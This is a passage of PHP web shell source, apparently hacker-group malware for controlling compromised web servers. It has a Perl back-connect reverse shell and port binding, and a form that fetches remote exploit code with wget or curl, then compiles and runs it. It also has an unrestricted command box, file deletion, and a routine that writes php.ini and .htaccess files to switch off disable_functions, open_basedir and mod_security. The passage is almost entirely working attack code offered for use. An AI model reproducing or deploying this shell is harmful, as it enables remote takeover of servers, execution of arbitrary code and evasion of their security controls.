            $msg = 'Now script try connect to ' . $ip . ' port ' . $port . ' ...';
        }
        // back connect with perl
        elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ('Perl' == $_POST['use'])) {
            $ip = trim($_POST['ip']);
            $port = trim($_POST['backport']);
            tulis('bcp', $back_connect);
            exe('chmod +x bcp');
            $p2 = which('perl');
            exe($p2 . ' bcp ' . $ip . ' ' . $port . ' &');
            $msg = 'Now script try connect to ' . $ip . ' port ' . $port . ' ...';
        } elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd'])) {
            $pilihan = trim($_POST['pilihan']);
            $wurl = trim($_POST['wurl']);
            $namafile = download($pilihan, $wurl);
            if (is_file($namafile)) {
                $msg = exe($wcmd);
            } else {
                $msg = "error: file not found $namafile";
            }
        } ?>
<table class="tabnet">
<tr><th>Port Binding</th><th>Connect Back</th><th>Load and Exploit</th></tr>
<tr>
<td>
<table>
<form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit">
<tr><td>Port</td><td><input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport; ?>"></td></tr>
<tr><td>Password</td><td><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"></td></tr>
<tr><td>Use</td><td style="text-align:justify"><p><select class="inputz" size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
<input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"></td></tr></form>
</table>
</td>
<td>
<table>
<form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit">
<tr><td>IP</td><td><input class="inputz" type="text" name="ip" size="26" value="<?php echo (getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ('127.0.0.1'); ?>"></td></tr>
<tr><td>Port</td><td><input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"></td></tr>
<tr><td>Use</td><td style="text-align:justify"><p><select size="1" class="inputz" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
<input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"></td></tr></form>
</table>
</td>
<td>
<table>
<form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit">
<tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"></td></tr>
<tr><td>cmd</td><td><input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"></td>
</tr>
<tr><td><select size="1" class="inputz" name="pilihan">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wlinks">links</option>
<option value="wget">GET</option>
<option value="wcurl">curl</option>
</select></td><td colspan="2"><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"></td></tr></form>
</table>
</td>
</tr>
</table>
<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
<?php
    } elseif (isset($_GET['x']) && ('shell' == $_GET['x'])) { ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post">
<table class="cmdbox">
<tr><td colspan="2">
<textarea class="output" readonly>
<?php
    if (isset($_POST['submitcmd'])) {
        echo @exe($_POST['cmd']);
    }
?>
</textarea>
<tr><td colspan="2"><?php echo $prompt; ?><input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /><input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:12%;" /></td></tr>
</table>
</form>
<?php
} else {
    if (isset($_GET['delete']) && ('' != $_GET['delete'])) {
        $file = $_GET['delete'];
        @unlink($file);
    } elseif (isset($_GET['fdelete']) && ('' != $_GET['fdelete'])) {
        @rmdir(rtrim($_GET['fdelete'], DIRECTORY_SEPARATOR));
    } elseif (isset($_GET['mkdir']) && ('' != $_GET['mkdir'])) {
        $path = $pwd . $_GET['mkdir'];
        @mkdir($path);
    }
    $buff = showdir($pwd, $prompt);
    echo $buff;
}
?>
<br><input class=inputzbut align=left type=submit name=ini value="Bypass Disable Functions and Safemode" />
<?php
if (isset($_POST['ini'])) {
    $byphp = 'safe_mode = Off
disable_functions = None
safe_mode_gid = OFF
open_basedir = OFF
allow_url_fopen = On';
    $byht = '<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckUnicodeEncoding Off
</IfModule>';
    file_put_contents('php.ini', $byphp);
    file_put_contents('.htaccess', $byht);
    echo "<script>alert('Disable Functions and Safemode Created'); hideAll();</script>";
    die();
}
?>
<?php
$str = 'PGNlbnRlcj48YnI+PGJyPjxkaXYgY2xhc3M9ImluZm8iPi09WyBEZXZlbG9wIGJ5IDxhIGhyZWY9Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9PZmZpY2lhbEJsb29kU2VjSGFja2Vycy5nb3YiPjxiPkQ0cmtqMW48L2I+PC9hPiBdPS08L2Rpdj48YnI+CjxkaXYgY2xhc3M9ImpheWEiPiZjb3B5OyAyMDEyLTIwMTQgPGEgaHJlZj0iaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL09mZmljaWFsQmxvb2RTZWNIYWNrZXJzLmdvdiI+Qmxvb2RTZWN1cml0eTwvYT48L2Rpdj48L2NlbnRlcj48YnI+PGJyPg==';
echo base64_decode($str);
?>	 
</script>
</div>
</body>
</html>